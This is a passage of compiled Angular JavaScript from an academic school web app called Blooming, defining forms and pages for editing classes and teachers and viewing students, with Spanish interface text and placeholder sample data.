        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 7)(17, "label", 10);
        \u0275\u0275text(18, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 11);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 7)(21, "label", 12);
        \u0275\u0275text(22, "N\xBA Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 13);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "button", 14);
        \u0275\u0275listener("click", function EditarClasesComponent_Template_button_click_24_listener() {
          return ctx.actualizarClase();
        });
        \u0275\u0275text(25, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(26, "a", 15);
        \u0275\u0275text(27, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(28, "div", 16)(29, "p", 17);
        \u0275\u0275text(30, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let EditarClasesComponent2 = _EditarClasesComponent;
  return EditarClasesComponent2;
})();

// src/app/pages/admin/editar-profesores/editar-profesores.component.ts
var EditarProfesoresComponent = /* @__PURE__ */ (() => {
  const _EditarProfesoresComponent = class _EditarProfesoresComponent {
    constructor(fb, profesorService, router, activatedRoute) {
      this.fb = fb;
      this.profesorService = profesorService;
      this.router = router;
      this.activatedRoute = activatedRoute;
      this.profesoresData = [];
      this.form = this.fb.group({
        ID_Profesor: [""],
        Nombre: [""],
        Apellidos: [""],
        Email: ["", [Validators.email]],
        ID_Centro: [""],
        ID_Clase: [""]
      });
    }
    ngOnInit() {
      this.activatedRoute.paramMap.subscribe((params) => {
        this.profesoresData = history.state.profesor;
        this.form.patchValue({
          ID_Profesor: this.profesoresData.ID_Profesor,
          Nombre: this.profesoresData.Nombre,
          Apellidos: this.profesoresData.Apellidos,
          Email: this.profesoresData.Email,
          ID_Centro: this.profesoresData.ID_Centro,
          ID_Clase: this.profesoresData.ID_Clase
        });
      });
    }
    actualizarProfesor() {
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.profesorService.putProfesor(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-profesores"]);
        });
      }
    }
  };
  _EditarProfesoresComponent.\u0275fac = function EditarProfesoresComponent_Factory(t) {
    return new (t || _EditarProfesoresComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(ProfesorService), \u0275\u0275directiveInject(Router), \u0275\u0275directiveInject(ActivatedRoute));
  };
  _EditarProfesoresComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarProfesoresComponent,
    selectors: [["app-editar-profesores"]],
    decls: 39,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["for", "Apellidos", 1, "form-label"], ["formControlName", "Apellidos", "id", "Apellidos", 1, "form-control"], ["for", "Email", 1, "form-label"], ["type", "email", "formControlName", "Email", "id", "Email", 1, "form-control"], ["for", "ID_Centro", 1, "form-label"], ["formControlName", "ID_Centro", "id", "ID_Centro", 1, "form-control"], ["for", "ID_Clase", 1, "form-label"], ["formControlName", "ID_Clase", "id", "ID_Clase", 1, "form-control"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-profesores", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarProfesoresComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 7)(17, "label", 10);
        \u0275\u0275text(18, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 11);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 7)(21, "label", 12);
        \u0275\u0275text(22, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 13);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 7)(25, "label", 14);
        \u0275\u0275text(26, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 15);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "div", 7)(29, "label", 16);
        \u0275\u0275text(30, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(31, "input", 17);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(32, "button", 18);
        \u0275\u0275listener("click", function EditarProfesoresComponent_Template_button_click_32_listener() {
          return ctx.actualizarProfesor();
        });
        \u0275\u0275text(33, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(34, "a", 19);
        \u0275\u0275text(35, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(36, "div", 20)(37, "p", 21);
        \u0275\u0275text(38, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let EditarProfesoresComponent2 = _EditarProfesoresComponent;
  return EditarProfesoresComponent2;
})();

// src/app/pages/profesores/profesores.component.ts
var import_sweetalert214 = __toESM(require_sweetalert2_all());
var ProfesoresComponent = /* @__PURE__ */ (() => {
  const _ProfesoresComponent = class _ProfesoresComponent {
    constructor(profesorService) {
      this.profesorService = profesorService;
      this.profesoresData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getProfesores();
    }
    getProfesores() {
      this.profesorService.getProfesores().subscribe((res) => {
        this.profesoresData = res;
      });
    }
    eliminarProfesor(id) {
      import_sweetalert214.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.profesorService.deleteProfesor(id).subscribe((res) => {
            this.getProfesores();
          });
          import_sweetalert214.default.fire({
            title: "Profesor Eliminado",
            icon: "success"
          });
        }
      });
    }
  };
  _ProfesoresComponent.\u0275fac = function ProfesoresComponent_Factory(t) {
    return new (t || _ProfesoresComponent)(\u0275\u0275directiveInject(ProfesorService));
  };
  _ProfesoresComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _ProfesoresComponent,
    selectors: [["app-profesores"]],
    decls: 21,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "row"], [1, "col-md-4"], [1, "card-title"], ["href", "/profesores/ver-alumnos", 1, "card-link"], ["href", "#", 1, "card-link"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function ProfesoresComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 3)(5, "div", 4)(6, "div", 5)(7, "div", 6)(8, "div", 3)(9, "div", 4)(10, "h5", 7);
        \u0275\u0275text(11, "1\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(12, "a", 8);
        \u0275\u0275text(13, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(14, "a", 9);
        \u0275\u0275text(15, "Eliminar Clase");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275element(16, "br")(17, "br");
        \u0275\u0275elementStart(18, "div", 10)(19, "p", 11);
        \u0275\u0275text(20, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let ProfesoresComponent2 = _ProfesoresComponent;
  return ProfesoresComponent2;
})();

// src/app/pages/profesores/ver-clases-p/ver-clases-p.component.ts
var VerClasesPComponent = /* @__PURE__ */ (() => {
  const _VerClasesPComponent = class _VerClasesPComponent {
  };
  _VerClasesPComponent.\u0275fac = function VerClasesPComponent_Factory(t) {
    return new (t || _VerClasesPComponent)();
  };
  _VerClasesPComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerClasesPComponent,
    selectors: [["app-ver-clases-p"]],
    decls: 147,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "row"], [1, "col-md-4"], [1, "card-title"], ["href", "/vista-alumnos", 1, "card-link"], ["href", "#", 1, "card-link"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function VerClasesPComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 3)(5, "div", 4)(6, "div", 5)(7, "div", 6)(8, "div", 3)(9, "div", 4)(10, "h5", 7);
        \u0275\u0275text(11, "1\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(12, "a", 8);
        \u0275\u0275text(13, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(14, "a", 9);
        \u0275\u0275text(15, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(16, "div", 6)(17, "div", 3)(18, "div", 4)(19, "h5", 7);
        \u0275\u0275text(20, "1\xBAB");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(21, "a", 8);
        \u0275\u0275text(22, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(23, "a", 9);
        \u0275\u0275text(24, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(25, "div", 6)(26, "div", 3)(27, "div", 4)(28, "h5", 7);
        \u0275\u0275text(29, "1\xBAC");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(30, "a", 8);
        \u0275\u0275text(31, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(32, "a", 9);
        \u0275\u0275text(33, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(34, "div", 6)(35, "div", 3)(36, "div", 4)(37, "h5", 7);
        \u0275\u0275text(38, "2\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(39, "a", 8);
        \u0275\u0275text(40, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(41, "a", 9);
        \u0275\u0275text(42, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(43, "div", 6)(44, "div", 3)(45, "div", 4)(46, "h5", 7);
        \u0275\u0275text(47, "2\xBAB");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(48, "a", 8);
        \u0275\u0275text(49, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(50, "a", 9);
        \u0275\u0275text(51, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(52, "div", 6)(53, "div", 3)(54, "div", 4)(55, "h5", 7);
        \u0275\u0275text(56, "2\xBAC");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(57, "a", 8);
        \u0275\u0275text(58, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(59, "a", 9);
        \u0275\u0275text(60, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(61, "div", 6)(62, "div", 3)(63, "div", 4)(64, "h5", 7);
        \u0275\u0275text(65, "3\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(66, "a", 8);
        \u0275\u0275text(67, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(68, "a", 9);
        \u0275\u0275text(69, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(70, "div", 6)(71, "div", 3)(72, "div", 4)(73, "h5", 7);
        \u0275\u0275text(74, "3\xBAB");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(75, "a", 8);
        \u0275\u0275text(76, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(77, "a", 9);
        \u0275\u0275text(78, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(79, "div", 6)(80, "div", 3)(81, "div", 4)(82, "h5", 7);
        \u0275\u0275text(83, "3\xBAC");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(84, "a", 8);
        \u0275\u0275text(85, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(86, "a", 9);
        \u0275\u0275text(87, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(88, "div", 6)(89, "div", 3)(90, "div", 4)(91, "h5", 7);
        \u0275\u0275text(92, "4\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(93, "a", 8);
        \u0275\u0275text(94, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(95, "a", 9);
        \u0275\u0275text(96, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(97, "div", 6)(98, "div", 3)(99, "div", 4)(100, "h5", 7);
        \u0275\u0275text(101, "4\xBAB");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(102, "a", 8);
        \u0275\u0275text(103, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(104, "a", 9);
        \u0275\u0275text(105, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(106, "div", 6)(107, "div", 3)(108, "div", 4)(109, "h5", 7);
        \u0275\u0275text(110, "4\xBAC");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(111, "a", 8);
        \u0275\u0275text(112, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(113, "a", 9);
        \u0275\u0275text(114, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(115, "div", 6)(116, "div", 3)(117, "div", 4)(118, "h5", 7);
        \u0275\u0275text(119, "5\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(120, "a", 8);
        \u0275\u0275text(121, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(122, "a", 9);
        \u0275\u0275text(123, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(124, "div", 6)(125, "div", 3)(126, "div", 4)(127, "h5", 7);
        \u0275\u0275text(128, "5\xBAB");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(129, "a", 8);
        \u0275\u0275text(130, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(131, "a", 9);
        \u0275\u0275text(132, "Eliminar Clase");
        \u0275\u0275elementEnd()()()();
        \u0275\u0275elementStart(133, "div", 6)(134, "div", 3)(135, "div", 4)(136, "h5", 7);
        \u0275\u0275text(137, "5\xBAC");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(138, "a", 8);
        \u0275\u0275text(139, "Ver Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(140, "a", 9);
        \u0275\u0275text(141, "Eliminar Clase");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275element(142, "br")(143, "br");
        \u0275\u0275elementStart(144, "div", 10)(145, "p", 11);
        \u0275\u0275text(146, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerClasesPComponent2 = _VerClasesPComponent;
  return VerClasesPComponent2;
})();

// src/app/pages/profesores/ver-perfil-alumno/ver-perfil-alumno.component.ts
var VerPerfilAlumnoComponent = /* @__PURE__ */ (() => {
  const _VerPerfilAlumnoComponent = class _VerPerfilAlumnoComponent {
  };
  _VerPerfilAlumnoComponent.\u0275fac = function VerPerfilAlumnoComponent_Factory(t) {
    return new (t || _VerPerfilAlumnoComponent)();
  };
  _VerPerfilAlumnoComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerPerfilAlumnoComponent,
    selectors: [["app-ver-perfil-alumno"]],
    decls: 46,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "profile-container", "text-center"], ["src", "../assets/images/avatar.jpg", "alt", "Foto de perfil", 1, "profile-image", "rounded-circle"], [1, "badge", "bg-success", "rounded-3", "fw-semibold"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "rgb(250, 252, 251)", "border-radius", "1em"], [1, "card-title", "fw-semibold", "mb-4"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], ["href", "/profesores/actividad-reciente", 1, "btn", "btn-dark"], ["href", "/profesores/ver-alumnos", 1, "btn", "btn-light"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function VerPerfilAlumnoComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "div", 5);
        \u0275\u0275element(8, "img", 6);
        \u0275\u0275elementStart(9, "h3");
        \u0275\u0275text(10, "Luc\xEDa Mart\xEDnez");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(11, "span", 7);
        \u0275\u0275text(12, "Bueno");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(13, "div", 4)(14, "div", 3)(15, "div", 4)(16, "table", 8)(17, "h5", 9);
        \u0275\u0275text(18, "\xDAltimas respuestas");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(19, "thead", 10)(20, "tr")(21, "th", 11);
        \u0275\u0275text(22, "Pregunta");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(23, "th", 11);
        \u0275\u0275text(24, "Respuesta");
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(25, "tbody")(26, "tr")(27, "td", 11);
        \u0275\u0275text(28, "\xBFQu\xE9 es lo que m\xE1s te gusta hacer?");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(29, "td", 11);
        \u0275\u0275text(30, "Jugar con mis compa\xF1eros");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(31, "tr")(32, "td", 11);
        \u0275\u0275text(33, "\xBFQu\xE9 es lo que m\xE1s te gusta hacer?");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(34, "td", 11);
        \u0275\u0275text(35, "Jugar con mis compa\xF1eros");
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(36, "td", 11)(37, "a", 12);
        \u0275\u0275text(38, "Ver Cuestionario");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(39, "a", 13);
        \u0275\u0275text(40, "Volver");
        \u0275\u0275elementEnd()()()()()()()()()();
        \u0275\u0275element(41, "br")(42, "br");
        \u0275\u0275elementStart(43, "div", 14)(44, "p", 15);
        \u0275\u0275text(45, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()()();
      }
    },
    styles: ["\n\n.profile-container[_ngcontent-%COMP%] {\n  margin-top: 50px;\n}\n.profile-image[_ngcontent-%COMP%] {\n  width: 150px;\n  height: 150px;\n  object-fit: cover;\n  border: 3px solid #fff;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9wcm9mZXNvcmVzL3Zlci1wZXJmaWwtYWx1bW5vL3Zlci1wZXJmaWwtYWx1bW5vLmNvbXBvbmVudC5jc3MiXSwKICAic291cmNlc0NvbnRlbnQiOiBbIlxyXG4ucHJvZmlsZS1jb250YWluZXIge1xyXG4gICAgbWFyZ2luLXRvcDogNTBweDsgLyogQWp1c3RhIHNlZ1x1MDBGQW4gc2VhIG5lY2VzYXJpbyAqL1xyXG4gIH1cclxuXHJcbiAgLnByb2ZpbGUtaW1hZ2Uge1xyXG4gICAgd2lkdGg6IDE1MHB4O1xyXG4gICAgaGVpZ2h0OiAxNTBweDtcclxuICAgIG9iamVjdC1maXQ6IGNvdmVyO1xyXG4gICAgYm9yZGVyOiAzcHggc29saWQgI2ZmZjsgLyogQWp1c3RhIGVsIGdyb3NvciB5IGNvbG9yIGRlbCBib3JkZSBzZWdcdTAwRkFuIHNlYSBuZWNlc2FyaW8gKi9cclxuICB9XHJcblxyXG4iXSwKICAibWFwcGluZ3MiOiAiO0FBQ0EsQ0FBQztBQUNHLGNBQVk7QUFDZDtBQUVBLENBQUM7QUFDQyxTQUFPO0FBQ1AsVUFBUTtBQUNSLGNBQVk7QUFDWixVQUFRLElBQUksTUFBTTtBQUNwQjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerPerfilAlumnoComponent2 = _VerPerfilAlumnoComponent;
  return VerPerfilAlumnoComponent2;
})();

// src/app/pages/profesores/actividad-reciente/actividad-reciente.component.ts
var ActividadRecienteComponent = /* @__PURE__ */ (() => {
  const _ActividadRecienteComponent = class _ActividadRecienteComponent {
  };
  _ActividadRecienteComponent.\u0275fac = function ActividadRecienteComponent_Factory(t) {
    return new (t || _ActividadRecienteComponent)();
  };
  _ActividadRecienteComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _ActividadRecienteComponent,
    selectors: [["app-actividad-reciente"]],
    decls: 47,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], ["href", "/profesores/ver-perfil-alumno", 1, "btn", "btn-light"], ["href", "/profesores/dashboard", 1, "btn", "btn-light"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function ActividadRecienteComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Actividad Reciente");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Fecha de nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "th", 8);
        \u0275\u0275text(21, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "th", 8);
        \u0275\u0275text(23, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(24, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(25, "tbody")(26, "tr")(27, "td", 8);
        \u0275\u0275text(28, "Pepe");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(29, "td", 8);
        \u0275\u0275text(30, "Pepe1");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(31, "td", 8);
        \u0275\u0275text(32, "24/10/2015");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(33, "td", 8);
        \u0275\u0275text(34, "1\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(35, "td", 8);
        \u0275\u0275text(36, "Cole1");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(37, "td", 8)(38, "a", 9);
        \u0275\u0275text(39, "Ver Perfil");
        \u0275\u0275elementEnd()()()()()()();
        \u0275\u0275elementStart(40, "a", 10);
        \u0275\u0275text(41, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(42, "br")(43, "br");
        \u0275\u0275elementStart(44, "div", 11)(45, "p", 12);
        \u0275\u0275text(46, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let ActividadRecienteComponent2 = _ActividadRecienteComponent;
  return ActividadRecienteComponent2;
})();

// src/app/pages/profesores/ver-alumnos-p/ver-alumnos-p.component.ts
var VerAlumnosPComponent = /* @__PURE__ */ (() => {
  const _VerAlumnosPComponent = class _VerAlumnosPComponent {
  };
  _VerAlumnosPComponent.\u0275fac = function VerAlumnosPComponent_Factory(t) {
    return new (t || _VerAlumnosPComponent)();
  };
  _VerAlumnosPComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerAlumnosPComponent,
    selectors: [["app-ver-alumnos-p"]],
    decls: 53,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [1, "d-flex", "align-items-center", "gap-2"], [1, "badge", "bg-success", "rounded-3", "fw-semibold"], ["href", "/profesores/ver-perfil-alumno", 1, "btn", "btn-light"], ["href", "/profesores/dashboard", 1, "btn", "btn-light"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function VerAlumnosPComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Clase 1\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
